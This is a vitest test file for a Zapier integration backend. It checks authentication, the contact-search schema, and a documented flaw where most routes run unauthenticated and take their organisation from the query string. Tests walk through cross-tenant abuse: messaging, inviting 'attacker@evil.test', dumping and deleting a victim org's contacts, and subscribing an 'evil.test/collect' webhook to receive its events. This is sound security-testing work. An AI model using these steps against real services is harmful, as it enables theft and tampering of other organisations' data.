import { beforeEach, describe, expect, test, vi } from "vitest";

vi.mock("../../../../utils/logger.js", () => ({
  log: { error: vi.fn(), info: vi.fn(), trace: vi.fn(), warn: vi.fn(), debug: vi.fn() },
}));

vi.mock("../../integrations.service.js", () => ({
  getIntegrationByName: vi.fn(),
  updateIntegrationByName: vi.fn(),
}));

vi.mock("bcrypt", () => ({ default: { compare: vi.fn() } }));

vi.mock("../../../contact/contact.service.js", () => ({
  deleteContactById: vi.fn(),
  getContactById: vi.fn(),
  updateContactById: vi.fn(),
  updateContactLabelsById: vi.fn(),
}));

vi.mock("../../../whatsapp/whatsappSurvey/wasurvey.service.js", () => ({
  sendTextMessage: vi.fn(),
}));

vi.mock("./zapier.service.js", async () => {
  const actual = await vi.importActual<any>("./zapier.service.js");
  return {
    ZapierTriggers: actual.ZapierTriggers,
    deleteContactByPhoneNumberAndOrgId: vi.fn(),
    getContactsByPhoneNumberAndOrgId: vi.fn(),
    getLifecyclesByOrgId: vi.fn(),
    getSampleDataForTrigger: vi.fn(),
    getTicketBoardsByTeamId: vi.fn(),
    getTicketColumnsByBoardId: vi.fn(),
    getUserIdByEmailAndOrgId: vi.fn(),
  };
});

vi.mock("../../../ticket/ticketCard/card.service.js", () => ({ createCard: vi.fn() }));
vi.mock("../../../contact/contactGroup/contactGroup.service.js", () => ({
  addNewContactsToGroup: vi.fn(),
  getContactGroupsByOrgId: vi.fn(),
  getContactGroupsByTeamId: vi.fn(),
}));
vi.mock("../../../team/team.service.js", () => ({
  getTeamsByOrgId: vi.fn(),
  inviteTeamMember: vi.fn(),
}));
vi.mock("../../../contact/contact.controller.js", () => ({ createContactHandler: vi.fn() }));

import bcrypt from "bcrypt";
import { getIntegrationByName, updateIntegrationByName } from "../../integrations.service.js";
import { sendTextMessage } from "../../../whatsapp/whatsappSurvey/wasurvey.service.js";
import { inviteTeamMember } from "../../../team/team.service.js";
import { createCard } from "../../../ticket/ticketCard/card.service.js";
import { deleteContactById, getContactById } from "../../../contact/contact.service.js";
import {
  deleteContactByPhoneNumberAndOrgId,
  getContactsByPhoneNumberAndOrgId,
  getSampleDataForTrigger,
  getUserIdByEmailAndOrgId,
} from "./zapier.service.js";
import {
  deleteContactHandler,
  getContactHandler,
  getSampleDataForTriggerHandler,
  inviteMemberHandler,
  sendTextMessageHandler,
  subscribeTriggerHandler,
  zapierAuthenticationHandler,
} from "./zapier.controller.js";
import { zapierRoutes } from "./zapier.route.js";
import { contactSearchSchema } from "./zapier.schema.js";
import { externalIntegrationRoutes } from "../external.route.js";

type Mock = ReturnType<typeof vi.fn>;

const ORG = "11111111-1111-1111-1111-111111111111";
const VICTIM_ORG = "22222222-2222-2222-2222-222222222222";

function reply() {
  const rep: any = { code: vi.fn(() => rep), send: vi.fn(() => rep) };
  return rep;
}

function answer(rep: any) {
  return { code: rep.code.mock.calls[0]?.[0], body: rep.send.mock.calls[0]?.[0] };
}

beforeEach(() => {
  vi.clearAllMocks();
  (getIntegrationByName as unknown as Mock).mockResolvedValue({
    id: "int-1",
    orgId: ORG,
    name: "zapier",
    active: true,
    credential: { accessToken: "$2b$10$storedhash", triggerSubscriptions: [] },
  });
  (updateIntegrationByName as unknown as Mock).mockResolvedValue({ id: "int-1" });
  (bcrypt.compare as unknown as Mock).mockResolvedValue(true);
  (sendTextMessage as unknown as Mock).mockResolvedValue({ status: true });
  (inviteTeamMember as unknown as Mock).mockResolvedValue({ id: "invite-1" });
  (createCard as unknown as Mock).mockResolvedValue({ ticketId: "T-1" });
  (getUserIdByEmailAndOrgId as unknown as Mock).mockResolvedValue({ userId: "user-1" });
  (getSampleDataForTrigger as unknown as Mock).mockResolvedValue([]);
  (getContactsByPhoneNumberAndOrgId as unknown as Mock).mockResolvedValue([]);
  (getContactById as unknown as Mock).mockResolvedValue(null);
  (deleteContactById as unknown as Mock).mockResolvedValue({ id: "c-1" });
  (deleteContactByPhoneNumberAndOrgId as unknown as Mock).mockResolvedValue({ id: "c-1" });
});

// ===========================================================================
// Where the authentication is, and is not
// ===========================================================================

describe("route registration", () => {
  function server() {
    const routes: any[] = [];
    const hooks: any[] = [];
    const srv: any = {
      addHook: vi.fn((name, fn) => hooks.push({ name, fn })),
      register: vi.fn(),
      get: vi.fn((url, opts, handler) => routes.push({ method: "GET", url, opts, handler })),
      post: vi.fn((url, opts, handler) => routes.push({ method: "POST", url, opts, handler })),
      put: vi.fn((url, opts, handler) => routes.push({ method: "PUT", url, opts, handler })),
      delete: vi.fn((url, opts, handler) => routes.push({ method: "DELETE", url, opts, handler })),
    };
    return { srv, routes, hooks };
  }

  // zapierAuthenticationHandler sets request.user and only replies when the url
  // contains "/auth" — the shape of a preHandler — but it was registered as the
  // HANDLER of POST /auth and nowhere else, so every other route in this tree ran
  // unauthenticated while taking its organisation from the query string.
  test("authenticates the whole tree with a preHandler hook", async () => {
    const { srv, routes, hooks } = server();

    await zapierRoutes(srv);

    expect(hooks).toHaveLength(1);
    expect(hooks[0].name).toBe("preHandler");
    expect(hooks[0].fn).toBe(zapierAuthenticationHandler);
    // The hook covers every route, so none of them needs its own.
    for (const r of routes) {
      expect(r.opts?.onRequest).toBeUndefined();
    }
  });

  test("registers eighteen routes, of which exactly one is the auth endpoint", async () => {
    const { srv, routes } = server();

    await zapierRoutes(srv);

    expect(routes).toHaveLength(18);
    expect(routes.filter((r) => r.url === "/auth")).toHaveLength(1);
  });

  test("the parent adds nothing either", async () => {
    const { srv, hooks } = server();

    await externalIntegrationRoutes(srv);

    expect(hooks).toHaveLength(0);
    expect(srv.register).toHaveBeenCalledTimes(2);
  });

  test("every route other than /auth carries a data-bearing handler", async () => {
    const { srv, routes } = server();

    await zapierRoutes(srv);

    const unauthenticated = routes.filter((r) => r.url !== "/auth");
    expect(unauthenticated.map((r) => `${r.method} ${r.url}`)).toEqual([
      "POST /subscribe",
      "DELETE /subscribe",
      "GET /sample-data",
      "GET /teams",
      "GET /ticket-boards",
      "GET /ticket-column",
      "GET /group",
      "GET /lifecycle",
      "POST /send-message",
      "PUT /contact-lifecycle",
      "POST /contact",
      "PUT /contact",
      "GET /contact",
      "DELETE /contact",
      "POST /ticket",
      "POST /add-group-member",
      "POST /invite-member",
    ]);
  });
});

// ===========================================================================
// zapierAuthenticationHandler — what it does when it IS reached
// ===========================================================================

describe("zapierAuthenticationHandler", () => {
  const req = (over: any = {}) => ({
    query: { orgId: ORG },
    headers: { authorization: "Bearer plain-api-key" },
    url: "/api/integration/external/zapier/auth",
    ...over,
  });

  test("compares the presented key against the stored bcrypt hash", async () => {
    await zapierAuthenticationHandler(req() as never, reply());

    expect(bcrypt.compare).toHaveBeenCalledWith("plain-api-key", "$2b$10$storedhash");
  });

  test("answers with the resolved user on success", async () => {
    const rep = reply();

    await zapierAuthenticationHandler(req() as never, rep);

    expect(answer(rep).body).toEqual({ user: { orgId: ORG, role: "SUPER_ADMIN" } });
  });

  // NOTE: the identity it mints is SUPER_ADMIN of whichever org the query
  // string named. That is only safe because the key was checked against that
  // same org — which is exactly the check the other routes never run.
  test("mints a SUPER_ADMIN identity for the org named in the query string", async () => {
    const request: any = req();

    await zapierAuthenticationHandler(request, reply());

    expect(request.user).toEqual({ orgId: ORG, role: "SUPER_ADMIN" });
  });

  test("401s a key that does not match", async () => {
    (bcrypt.compare as unknown as Mock).mockResolvedValueOnce(false);
    const rep = reply();

    await zapierAuthenticationHandler(req() as never, rep);

    expect(answer(rep).code).toBe(401);
  });

  test("401s when the org has no active zapier integration", async () => {
    (getIntegrationByName as unknown as Mock).mockResolvedValueOnce({
      active: false,
      credential: { accessToken: "$2b$10$storedhash" },
    });
    const rep = reply();

    await zapierAuthenticationHandler(req() as never, rep);

    expect(answer(rep).code).toBe(401);
  });

  test("404s a request with no orgId", async () => {
    const rep = reply();

    await zapierAuthenticationHandler(req({ query: {} }) as never, rep);

    expect(answer(rep)).toEqual({ code: 404, body: { message: "Not found" } });
  });

  test("400s a non-bearer authorization header", async () => {
    const rep = reply();

    await zapierAuthenticationHandler(req({ headers: { authorization: "Basic x" } }) as never, rep);

    expect(answer(rep).code).toBe(400);
  });

  // NOTE: authHeader.startsWith is read before the header is checked for
  // existence, so a request with no Authorization header lands in the catch and
  // is reported as 401 rather than 400 — the right outcome by accident.
  test("400s a request with no authorization header at all", async () => {
    // BUG (fixed): `authHeader.startsWith(...)` was called unguarded, so a
    // wholly missing header (`authHeader === undefined`) threw a raw
    // TypeError that fell through to the handler's outer catch, giving a
    // generic 401 "Not authorized" instead of the specific "no bearer token"
    // 400 response a malformed-but-present header already got. Guarding with
    // `!authHeader ||` makes a missing header behave the same, correct way as
    // a present-but-wrong-shaped one.
    const rep = reply();

    await zapierAuthenticationHandler(req({ headers: {} }) as never, rep);

    expect(answer(rep)).toEqual({
      code: 400,
      body: { message: "Invalid request", error: "No bearer token found in headers" },
    });
  });

  test("logs the full header set, bearer token included, when the shape is wrong", async () => {
    const { log } = await import("../../../../utils/logger.js");

    await zapierAuthenticationHandler(
      req({ headers: { authorization: "Basic secret" } }) as never,
      reply(),
    );

    expect((log.error as unknown as Mock).mock.calls[0]).toContain(
      "No bearer token found in headers\n%o",
    );
  });
});

// ===========================================================================
// The handlers, driven directly — each takes its org from the query string
// ===========================================================================

describe("the unauthenticated handlers take their org from the query string", () => {
  test("send-message dispatches WhatsApp for whatever org is named", async () => {
    const rep = reply();

    await sendTextMessageHandler(
      { query: { orgId: VICTIM_ORG }, body: { phone: "919876543210", message: "hi" } } as never,
      rep,
    );

    expect(sendTextMessage).toHaveBeenCalledWith(
      { phone: "919876543210", orgId: VICTIM_ORG },
      null,
      "hi",
    );
    expect(answer(rep).body).toEqual({ success: true });
  });

  test("send-message never looks at request.user", async () => {
    const req: any = {
      query: { orgId: VICTIM_ORG },
      body: { phone: "1", message: "m" },
      get user() {
        throw new Error("request.user was read");
      },
    };

    await expect(sendTextMessageHandler(req, reply())).resolves.toBeUndefined();
  });

  test("invite-member invites into whatever org is named", async () => {
    await inviteMemberHandler(
      {
        query: { orgId: VICTIM_ORG },
        body: {
          teamId: "team-1",
          email: "attacker@evil.test",
          name: "Attacker",
          invitedByEmail: "owner@victim.test",
        },
      } as never,
      reply(),
    );

    expect(inviteTeamMember).toHaveBeenCalledWith({
      orgId: VICTIM_ORG,
      type: "TEAM",
      invitedBy: "user-1",
      teamId: "team-1",
      email: "attacker@evil.test",
      name: "Attacker",
    });
  });

  // NOTE: invitedByEmail is looked up inside the target org, so the invite is
  // attributed to a real member of that org rather than to the caller.
  test("invite-member attributes the invite to a member of the target org", async () => {
    await inviteMemberHandler(
      {
        query: { orgId: VICTIM_ORG },
        body: { teamId: "t", email: "a@b.test", name: "A", invitedByEmail: "owner@victim.test" },
      } as never,
      reply(),
    );

    expect(getUserIdByEmailAndOrgId).toHaveBeenCalledWith("owner@victim.test", VICTIM_ORG);
  });

  test("sample-data dumps records for whatever org is named", async () => {
    (getSampleDataForTrigger as unknown as Mock).mockResolvedValueOnce([
      { id: "c-1", name: "Ann", email: "ann@victim.test", phone: "919876543210" },
    ]);
    const rep = reply();

    await getSampleDataForTriggerHandler(
      { query: { orgId: VICTIM_ORG, triggerKey: "new_contact_create", page: 0 } } as never,
      rep,
    );

    expect(getSampleDataForTrigger).toHaveBeenCalledWith("new_contact_create", VICTIM_ORG, 0);
    expect(answer(rep).body[0].email).toBe("ann@victim.test");
  });

  test("contact search reads by phone within whatever org is named", async () => {
    await getContactHandler({ query: { orgId: VICTIM_ORG, phone: "98765" } } as never, reply());

    expect(getContactsByPhoneNumberAndOrgId).toHaveBeenCalledWith("98765", VICTIM_ORG);
  });

  // by-id reads go through the contact module's getContactById, which used to
  // take no org at all — so a contact id alone was enough. It
  // now carries the org named in the query, the same one the by-phone branch
  // beside it already used. (These zapier handlers taking their org from the
  // request rather than a session is a separate, pre-existing concern, recorded
  // by the surrounding describe.)
  test("contact search by id carries the named org", async () => {
    (getContactById as unknown as Mock).mockResolvedValueOnce({ id: "c-1", name: "Ann" });
    const rep = reply();

    await getContactHandler({ query: { contactId: "c-1", orgId: VICTIM_ORG } } as never, rep);

    expect(getContactById).toHaveBeenCalledWith("c-1", VICTIM_ORG);
    expect(answer(rep).body).toEqual([{ id: "c-1", name: "Ann" }]);
  });

  test("contact delete by id carries the named org", async () => {
    await deleteContactHandler(
      { query: { orgId: VICTIM_ORG }, body: { contactId: "c-1" } } as never,
      reply(),
    );

    expect(deleteContactById).toHaveBeenCalledWith("c-1", VICTIM_ORG);
  });

  test("contact delete by phone deletes inside whatever org is named", async () => {
    await deleteContactHandler(
      { query: { orgId: VICTIM_ORG }, body: { phone: "919876543210" } } as never,
      reply(),
    );

    expect(deleteContactByPhoneNumberAndOrgId).toHaveBeenCalledWith(VICTIM_ORG, "919876543210");
  });

  test("subscribe writes a trigger into whatever org is named", async () => {
    await subscribeTriggerHandler(
      {
        query: { orgId: VICTIM_ORG },
        body: {
          hookUrl: "https://hooks.zapier.com/attacker",
          subscribed_field: "new_contact_create",
          zapId: "z-1",
        },
      } as never,
      reply(),
    );

    const [orgId, name, payload] = (updateIntegrationByName as unknown as Mock).mock.calls[0];
    expect(orgId).toBe(VICTIM_ORG);
    expect(name).toBe("zapier");
    expect(payload.credential.triggerSubscriptions[0].hookUrl).toBe(
      "https://hooks.zapier.com/attacker",
    );
  });

  // NOTE: once subscribed, that URL receives the org's contact, message and
  // ticket events for as long as it stays in the credential.
  test("a subscribed hook is stored as active with no verification", async () => {
    await subscribeTriggerHandler(
      {
        query: { orgId: VICTIM_ORG },
        body: {
          hookUrl: "https://evil.test/collect",
          subscribed_field: "new_message_received",
          zapId: "z",
        },
      } as never,
      reply(),
    );

    const stored = (updateIntegrationByName as unknown as Mock).mock.calls[0][2].credential
      .triggerSubscriptions[0];
    expect(stored.active).toBe(true);
  });
});

// ===========================================================================
// contactSearchSchema
// ===========================================================================

describe("contactSearchSchema", () => {
  // The refine used to read `!data?.contactId?.length && !data?.phone?.length`, so
  // it passed only when BOTH were empty — the inverse of its own message — and the
  // search and delete actions of the published Zapier app rejected every real
  // request.
  test("accepts a search that supplies a contactId", () => {
    expect(contactSearchSchema.safeParse({ contactId: "c-1", phone: "" }).success).toBe(true);
  });

  test("accepts a search that supplies a phone", () => {
    expect(contactSearchSchema.safeParse({ contactId: "", phone: "9876" }).success).toBe(true);
  });

  test("rejects a search that supplies neither", () => {
    const parsed = contactSearchSchema.safeParse({ contactId: "", phone: "" });

    expect(parsed.success).toBe(false);
    if (parsed.success) throw new Error("expected validation to fail");
    expect(parsed.error.issues[0].message).toBe(
      "Either contactId or phone number should be provided",
    );
  });

  test("accepts a request that omits the field it is not searching by", () => {
    expect(contactSearchSchema.safeParse({ phone: "9876" }).success).toBe(true);
  });

  test("rejects an empty object", () => {
    expect(contactSearchSchema.safeParse({}).success).toBe(false);
  });
});
